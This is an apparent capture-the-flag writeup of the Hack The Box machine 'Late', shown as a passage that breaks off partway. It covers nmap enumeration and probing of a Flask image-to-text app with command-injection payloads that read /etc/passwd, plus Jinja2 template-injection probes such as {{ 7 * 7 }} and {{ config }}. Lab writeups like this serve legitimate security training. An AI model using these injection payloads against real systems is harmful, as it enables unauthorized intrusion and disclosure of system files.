<!DOCTYPE html><html lang="en-US" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="Hack The Box - Late Writeup" /><meta property="og:locale" content="en_US" /><meta name="description" content="Zweilosec’s writeup on the Easy-difficulty Linux machine Late from https://hackthebox.com" /><meta property="og:description" content="Zweilosec’s writeup on the Easy-difficulty Linux machine Late from https://hackthebox.com" /><link rel="canonical" href="https://zweilosec.github.io/posts/late/" /><meta property="og:url" content="https://zweilosec.github.io/posts/late/" /><meta property="og:site_name" content="Hacker’s Rest" /><meta property="og:image" content="https://zweilosec.github.io/assets/img/late_0_infocard.png" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-07-24T14:00:00+00:00" /><meta name="twitter:card" content="summary_large_image" /><meta property="twitter:image" content="https://zweilosec.github.io/assets/img/late_0_infocard.png" /><meta property="twitter:title" content="Hack The Box - Late Writeup" /><meta name="twitter:site" content="@zweilosec" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2022-08-01T02:36:14+00:00","datePublished":"2022-07-24T14:00:00+00:00","description":"Zweilosec’s writeup on the Easy-difficulty Linux machine Late from https://hackthebox.com","headline":"Hack The Box - Late Writeup","image":"https://zweilosec.github.io/assets/img/late_0_infocard.png","mainEntityOfPage":{"@type":"WebPage","@id":"https://zweilosec.github.io/posts/late/"},"url":"https://zweilosec.github.io/posts/late/"}</script><title>Hack The Box - Late Writeup | Hacker's Rest</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Hacker's Rest"><meta name="application-name" content="Hacker's Rest"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script defer src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script async src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=UA-170504820-1"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'UA-170504820-1'); }); </script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/img/avatar/katana.gif" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Hacker's Rest</a></div><div class="site-subtitle font-italic">Notes documenting my journey to OSCP and beyond.</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>PS C:\>WHOAMI</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center"> <a href="https://github.com/zweilosec" aria-label="github" class="order-3" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/zweilosec" aria-label="twitter" class="order-4" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['example','doamin.com'].join('@')" aria-label="email" class="order-5" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" class="order-6" > <i class="fas fa-rss"></i> </a> <span class="icon-border order-2"></span> <span id="mode-toggle-wrapper" class="order-1"> <i class="mode-toggle fas fa-adjust"></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.updateMermaid(); }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer) ) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } updateMermaid() { if (typeof mermaid !== "undefined") { let expectedTheme = (this.modeStatus === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } this.updateMermaid(); } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>Hack The Box - Late Writeup</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Hack The Box - Late Writeup</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="semi-bold"> zweilosec </span> <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Sun, Jul 24, 2022, 2:00 PM +0000" prep="on" > Jul 24, 2022 <i class="unloaded">2022-07-24T14:00:00+00:00</i> </span></div><div> <span> <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Sun, Jul 31, 2022, 9:36 PM -0500" prefix="Updated " > Jul 31, 2022 <i class="unloaded">2022-08-01T02:36:14+00:00</i> </span> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="4690 words">26 min</span></div><div><meta name="twitter:card" content="summary"><meta name="twitter:site" content="@zweilosec"></div></div><div class="post-content"><h2 id="htb---late---101011156">HTB - Late - 10.10.11.156</h2><h2 id="overview">Overview</h2><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/late_0_infocard.png" alt="Descriptive information card about this machine" /></p><p>This supposedly ‘Easy’ difficulty Linux machine Late from https://hackthebox.com was both simple to figure out, and incredibly challenging to pull off. Patience was a key virtue to have while completing the first challenge. The way forward was fairly easy to find, but exploiting it took numerous iterations that could not be (easily?) scripted. I actually gave up on this one twice, but kept coming back since I knew exactly what I needed to do. In the end, my persistence paid off and I was in. The second challenge in this machine was both easy to find and easy to miss, depending on how observant you are. I learned how to use a new tool to gain the information I needed, and the challenge was quickly one. Overall I liked this machine, except for the pickiness of the initial payload execution.</p><h2 id="useful-skills-and-tools">Useful Skills and Tools</h2><h3 id="read-attributes-of-files-on-linux-with-lsattr">Read attributes of files on Linux with lsattr</h3><p><code class="language-plaintext highlighter-rouge">lsattr</code> lists the file attributes on a second extended file system. See <code class="language-plaintext highlighter-rouge">chattr</code> below for a description of each attribute.</p><p>Useful options:</p><div class="table-wrapper"><table><thead><tr><th>Argument<th>Description<tbody><tr><td><code class="language-plaintext highlighter-rouge">-R</code><td>Recursively list attributes of directories and their contents.<tr><td><code class="language-plaintext highlighter-rouge">-a</code><td>List all files in directories, including files that start with <code class="language-plaintext highlighter-rouge">.</code> (hidden files).<tr><td><code class="language-plaintext highlighter-rouge">-d</code><td>List directories like other files, rather than listing their contents.<tr><td><code class="language-plaintext highlighter-rouge">-l</code><td>Print the options using long names instead of single character abbreviations.</table></div><p>You can chain together these options to recursively list the attributes of all files and folders in a directory with long names:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>lsattr -Ral /home/
</pre></table></code></div></div><h3 id="change-attributes-of-files-on-linux-with-chattr">Change attributes of files on Linux with chattr</h3><p><code class="language-plaintext highlighter-rouge">chattr</code> changes the file attributes on a Linux file system.</p><blockquote><p>The format of a symbolic mode is <code class="language-plaintext highlighter-rouge">+-=[aAcCdDeFijmPsStTux]</code>.</p></blockquote><div class="table-wrapper"><table><thead><tr><th>Symbol<th>Meaning<tbody><tr><td><code class="language-plaintext highlighter-rouge">+</code><td>Add the following attributes the to specified file<tr><td><code class="language-plaintext highlighter-rouge">-</code><td>Remove the following attributes from the specified file<tr><td><code class="language-plaintext highlighter-rouge">=</code><td>Set the attributes of the specified file to be the following</table></div><p>The letters <code class="language-plaintext highlighter-rouge">aAcCdDeFijmPsStTux</code> select the new attributes for the specified files:</p><div class="table-wrapper"><table><thead><tr><th>Attribute<th>Description<tbody><tr><td><code class="language-plaintext highlighter-rouge">a</code><td>append only<tr><td><code class="language-plaintext highlighter-rouge">A</code><td>no atime updates<tr><td><code class="language-plaintext highlighter-rouge">c</code><td>compressed<tr><td><code class="language-plaintext highlighter-rouge">C</code><td>no copy on write<tr><td><code class="language-plaintext highlighter-rouge">d</code><td>no dump<tr><td><code class="language-plaintext highlighter-rouge">D</code><td>synchronous directory updates<tr><td><code class="language-plaintext highlighter-rouge">e</code><td>extent format<tr><td><code class="language-plaintext highlighter-rouge">F</code><td>case-insensitive directory lookups<tr><td><code class="language-plaintext highlighter-rouge">i</code><td>immutable<tr><td><code class="language-plaintext highlighter-rouge">j</code><td>data journaling<tr><td><code class="language-plaintext highlighter-rouge">m</code><td>don’t compress<tr><td><code class="language-plaintext highlighter-rouge">P</code><td>project hierarchy<tr><td><code class="language-plaintext highlighter-rouge">s</code><td>secure deletion<tr><td><code class="language-plaintext highlighter-rouge">S</code><td>synchronous updates<tr><td><code class="language-plaintext highlighter-rouge">t</code><td>tail-merging<tr><td><code class="language-plaintext highlighter-rouge">T</code><td>top of directory hierarchy<tr><td><code class="language-plaintext highlighter-rouge">u</code><td>undeletable<tr><td><code class="language-plaintext highlighter-rouge">x</code><td>direct access for files</table></div><p>The following attributes are read-only and may be listed by <code class="language-plaintext highlighter-rouge">lsattr</code> but not modified by <code class="language-plaintext highlighter-rouge">chattr</code>:</p><div class="table-wrapper"><table><thead><tr><th>Attribute<th>Description<tbody><tr><td><code class="language-plaintext highlighter-rouge">E</code><td>encrypted<tr><td><code class="language-plaintext highlighter-rouge">I</code><td>indexed directory<tr><td><code class="language-plaintext highlighter-rouge">N</code><td>inline data<tr><td><code class="language-plaintext highlighter-rouge">V</code><td>verity</table></div><p>See the <a href="https://www.man7.org/linux/man-pages/man1/chattr.1.html">chattr manpage</a> for more detailed descriptions of each attribute.</p><h2 id="enumeration">Enumeration</h2><h3 id="nmap-scan">Nmap scan</h3><p>I started my enumeration with an nmap scan of <code class="language-plaintext highlighter-rouge">10.10.10.156</code>. The options I regularly use are:</p><div class="table-wrapper"><table><thead><tr><th style="text-align: left"><code class="language-plaintext highlighter-rouge">Flag</code><th style="text-align: left">Purpose<tbody><tr><td style="text-align: left"><code class="language-plaintext highlighter-rouge">-p-</code><td style="text-align: left">A shortcut which tells nmap to scan all ports<tr><td style="text-align: left"><code class="language-plaintext highlighter-rouge">-vvv</code><td style="text-align: left">Gives very verbose output so I can see the results as they are found, and also includes some information not normally shown<tr><td style="text-align: left"><code class="language-plaintext highlighter-rouge">-sC</code><td style="text-align: left">Equivalent to <code class="language-plaintext highlighter-rouge">--script=default</code> and runs a collection of nmap enumeration scripts against the target<tr><td style="text-align: left"><code class="language-plaintext highlighter-rouge">-sV</code><td style="text-align: left">Does a service version scan<tr><td style="text-align: left"><code class="language-plaintext highlighter-rouge">-oA $name</code><td style="text-align: left">Saves all three formats (standard, greppable, and XML) of output with a filename of <code class="language-plaintext highlighter-rouge">$name</code><tr><td style="text-align: left"><code class="language-plaintext highlighter-rouge">-Pn</code><td style="text-align: left">Skips doing a ICMP ping check, useful for hosts that do not reply to these</table></div><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
</pre><td class="rouge-code"><pre>┌──(zweilos㉿kalimaa)-[~/htb/late]
└─$ nmap -Pn -vvv -p- --min-rate 1000 10.10.11.156 -oN ports.late          
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-20 19:38 CDT
Initiating Parallel DNS resolution of 1 host. at 19:38
Completed Parallel DNS resolution of 1 host. at 19:38, 0.05s elapsed
DNS resolution of 1 IPs took 0.05s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 19:38
Scanning 10.10.11.156 [65535 ports]
Discovered open port 22/tcp on 10.10.11.156
Discovered open port 80/tcp on 10.10.11.156
Completed Connect Scan at 19:39, 56.03s elapsed (65535 total ports)
Nmap scan report for 10.10.11.156
Host is up, received user-set (0.060s latency).
Scanned at 2022-07-20 19:38:10 CDT for 56s
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 56.17 seconds

┌──(zweilos㉿kalimaa)-[~/htb/late]
└─$ cat ports.late | grep open | cut -d '/' -f 1 | tr '\n' ',' &gt; ports
</pre></table></code></div></div><p>First I did a quick port sweep to see what was open, then used some bash tricks to pull out the ports from the output for doing a service scan.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
</pre><td class="rouge-code"><pre>┌──(zweilos㉿kalimaa)-[~/htb/late]
└─$ nmap -Pn -sCV -vvv -p$(cat ports) --min-rate 1000 10.10.11.156 -oA services.late

Nmap scan report for 10.10.11.156
Host is up, received user-set (0.070s latency).
Scanned at 2022-07-20 20:55:46 CDT for 9s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 02:5e:29:0e:a3:af:4e:72:9d:a4:fe:0d:cb:5d:83:07 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDSqIcUZeMzG+QAl/4uYzsU98davIPkVzDmzTPOmMONUsYleBjGVwAyLHsZHhgsJqM9lmxXkb8hT4ZTTa1azg4JsLwX1xKa8m+RnXwJ1DibEMNAO0vzaEBMsOOhFRwm5IcoDR0gOONsYYfz18pafMpaocitjw8mURa+YeY21EpF6cKSOCjkVWa6yB+GT8mOcTZOZStRXYosrOqz5w7hG+20RY8OYwBXJ2Ags6HJz3sqsyT80FMoHeGAUmu+LUJnyrW5foozKgxXhyOPszMvqosbrcrsG3ic3yhjSYKWCJO/Oxc76WUdUAlcGxbtD9U5jL+LY2ZCOPva1+/kznK8FhQN
|   256 41:e1:fe:03:a5:c7:97:c4:d5:16:77:f3:41:0c:e9:fb (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBMen7Mjv8J63UQbISZ3Yju+a8dgXFwVLgKeTxgRc7W+k33OZaOqWBctKs8hIbaOehzMRsU7ugP6zIvYb25Kylw=
|   256 28:39:46:98:17:1e:46:1a:1e:a1:ab:3b:9a:57:70:48 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIGrWbMoMH87K09rDrkUvPUJ/ZpNAwHiUB66a/FKHWrj
80/tcp open  http    syn-ack nginx 1.14.0 (Ubuntu)
|_http-title: Late - Best online image tools
|_http-favicon: Unknown favicon MD5: 1575FDF0E164C3DB0739CF05D9315BDF
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.14.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</pre></table></code></div></div><p>The service scan did not reveal much useful other than the version numbers of the services being run. Neither seemed immediately vulnerable to anything.</p><h3 id="port-80---http">Port 80 - HTTP</h3><p>Since I had no credentials for SSH I decided to start with enumeration of the HTTP service on port 80.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/late_1_http.png" alt="There was an HTTP website peddling the Worlds simplest image utilities" /></p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>contact info +234 23 9873237
support@late.htb
234 Hidden Pond Road, Ashland City, TN 37015
</pre></table></code></div></div><blockquote><p>Late 2022, Designed by kavigihan with ♥ (http://instagram.com/_kavi.gihan/)</p></blockquote><p>At the bottom of the page I looked for clues that would give me potential information about what the web server was running, or any potential web apps, and I found some contact information including an address and phone number. Interestingly, the phone number had a strange amount of numbers and did not match the address, which said it was in Tennessee, USA. I looked up the country code <code class="language-plaintext highlighter-rouge">+234</code> and found that it is registered to Nigeria. There was also an email address with the hostname <code class="language-plaintext highlighter-rouge">late.htb</code> which I added to my hosts file.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/late_2_contact.png" alt="The Contact page showing a second address and phone number" /></p><p>The ‘Contact Us’ page had a different address and phone number on it.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>Address
2002 Holcombe Boulevard, Houston, TX 77030, USA
Phone:
(713) 791-1414
</pre></table></code></div></div><p>The 713 area code on the phone number here actually matched the Houston, Texas address. There was also a form where a message could be submitted to the site. I tried a simple XSS test on the form, but after checking for a response in Burp I could see that the data wasn’t even being sent to the server.</p><p>On the main page of the website under the FAQ section I found a link to <code class="language-plaintext highlighter-rouge">http://images.late.htb/</code>.</p><blockquote><p>How can I edit photos online for free?</p><p>With <a href="http://images.late.htb/">late free online photo editor</a>, you can do just that. First, open Late’s free online photo editor website. Second, choose one editing feature you need, such as basic adjustments, portrait beauty, or photo effects from the left dashboard. Third, apply the feature, download, and share your final piece.</p></blockquote><p>I added <code class="language-plaintext highlighter-rouge">images.late.htb</code> to <code class="language-plaintext highlighter-rouge">/etc/hosts</code>, then tried both <code class="language-plaintext highlighter-rouge">late.htb</code> and the new subdomain to see if the site changed. <code class="language-plaintext highlighter-rouge">late.htb</code> simply brought up the main page again, but <code class="language-plaintext highlighter-rouge">images.late.htb</code> pulled up something new.</p><h2 id="the-image-converter">The image converter</h2><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/late_3_convert.png" alt="A site with the title Convert image to text with Flask" /></p><p>I followed the link from the first page, which took me to an online image converter. This page purported to be able to turn an image into a text document. If nothing else, the backend (built on Flask, which means Python) seemed like it would be attempting to do optical character recognition (OCR) and parsing text from any images uploaded. There was an upload button, so of course I tried uploading some different backdoors and python scripts, but nothing seemed to execute. After a couple of tries I got an error message on the site whenever I tried to upload another file:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/late_6_no_space.png" alt="The error message saying no space left on the device" /></p><blockquote><p>Error occured while processing the image: [Errno 28] No space left on device</p></blockquote><p>No matter what file I uploaded, I received the same error message, so I reverted the machine on Hack the Box. After this it seemed to work much better.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/late_3_convert2.png" alt="After resetting the machine the page layout looked much cleaner" /></p><p>After resetting the machine the page layout looked like it was actually loading CSS, and I never got the error message again.</p><p>Since my test code examples failed to execute as far as I could tell, I tried uploading an image with a simple bash command payload. Depending on how the text was being parsed and what it did with it afterwards would determine how to proceed.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/late_4_test_upload.png" alt="an image with my basic bash shell command payload" /></p><div class="language-html highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="nt">&lt;p&gt;</span>test; cat /etc/passwd
<span class="nt">&lt;/p&gt;</span>
</pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/late_7_results.png" alt="The results.txt download after each upload" /></p><p>After uploading the image, I got back a file download of <code class="language-plaintext highlighter-rouge">results.txt</code> ,which contained the text from my image embedded in html <code class="language-plaintext highlighter-rouge">&lt;p&gt;</code> tags. The site was able to correctly parse the text in the image I sent it, however, it did not look like I could run shell commands directly. Next I tried to run python code in the same way.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/late_8_test_upload2.png" alt="a simple python payload" /></p><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kn">import</span> <span class="nn">os</span><span class="p">;</span>
<span class="n">os</span><span class="p">.</span><span class="n">system</span><span class="p">(</span><span class="err">‘</span><span class="n">cat</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">passwd</span><span class="s">')|
&lt;/p&gt;
</span></pre></table></code></div></div><p>Unfortunately this did not work either. I thought at the time that it was perhaps because it incorrectly read my single quote as a backtick. Next, I tried an old trick of embedding the code directly into the image code using Burp.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/late_5_burp_png.png" alt="Sending a POST request to the server with a modified png file" /></p><p>I captured the POST request of the file upload, then forwarded it using Burp repeater. This did not seem to work as intended, but revealed some interesting information instead through an error message.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>Error occured while processing the image: cannot identify image file '/home/svc_acc/app/uploads/late_9_test_upload31.png6662'
</pre></table></code></div></div><p>The error message recieved after sending my malformed PNG file showed the username and directory of the running web application. I decided to do some more reading on the backend of this web app and how Flask might be used to power it.</p><ul><li>https://medium.com/@amanzishan.az/building-a-flask-web-application-to-extract-text-from-images-3f761f4880d9<li>https://pythonbasics.org/what-is-flask-python/</ul><blockquote><p>jinja2</p><p>jinja2 is a popular template engine for Python.A web template system combines a template with a specific data source to render a dynamic web page.</p><p>This allows you to pass Python variables into HTML templates like this:</p></blockquote><div class="language-javascript highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre><span class="o">&lt;</span><span class="nx">html</span><span class="o">&gt;</span>
    <span class="o">&lt;</span><span class="nx">head</span><span class="o">&gt;</span>
        <span class="o">&lt;</span><span class="nx">title</span><span class="o">&gt;</span><span class="p">{{</span> <span class="nx">title</span> <span class="p">}}</span><span class="o">&lt;</span><span class="sr">/title</span><span class="err">&gt;
</span>    <span class="o">&lt;</span><span class="sr">/head</span><span class="err">&gt;
</span>    <span class="o">&lt;</span><span class="nx">body</span><span class="o">&gt;</span>
        <span class="o">&lt;</span><span class="nx">h1</span><span class="o">&gt;</span><span class="nx">Hello</span> <span class="p">{{</span> <span class="nx">username</span> <span class="p">}}</span><span class="o">&lt;</span><span class="sr">/h1</span><span class="err">&gt;
</span>    <span class="o">&lt;</span><span class="sr">/body</span><span class="err">&gt;
</span><span class="o">&lt;</span><span class="sr">/html</span><span class="err">&gt;
</span></pre></table></code></div></div><p>I quickly recognized the double curly brace syntax from my recent adventures doing the machine Catch from Hack the Box (see my <a href="https://zweilosec.github.io/posts/catch/">writeup here</a>!) In this challenge I had used Server Side Template Injection (SSTI) to get the server to execute code through injection in the code parser.</p><ul><li>https://kleiber.me/blog/2021/10/31/python-flask-jinja2-ssti-example/<li>https://medium.com/@nyomanpradipta120/ssti-in-flask-jinja2-20b068fdaeee</ul><p>This was plenty of information to start trying to test for SSTI vulnerabilities in Flask using Jinja.</p><p>I sent a standard payload <code class="language-plaintext highlighter-rouge">{{ 7 * 7 }}</code> to test for potential code execution. If the vulnerablitiy existed, the results I got back should contain the result of the math expression, and not just the text.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/late_10_ssti_confirmed.png" alt="results.txt showing code execution" /></p><p>After opening the new <code class="language-plaintext highlighter-rouge">results.txt</code>, I got back confirmation that there was indeed an SSTI vulnerability. Now, I just had to test if it could be exploited to run other arbitrary code. As I found out during the <a href="https://zweilosec.github.io/posts/catch/">previous challenge</a> sometimes simple math gets through, but filters block anything more advanced.</p><p>Going off the blog posts I found during my research into Jinja SSTI vulnerabilities, I sent the payload <code class="language-plaintext highlighter-rouge">{{ config }} </code></p><div class="language-javascript highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
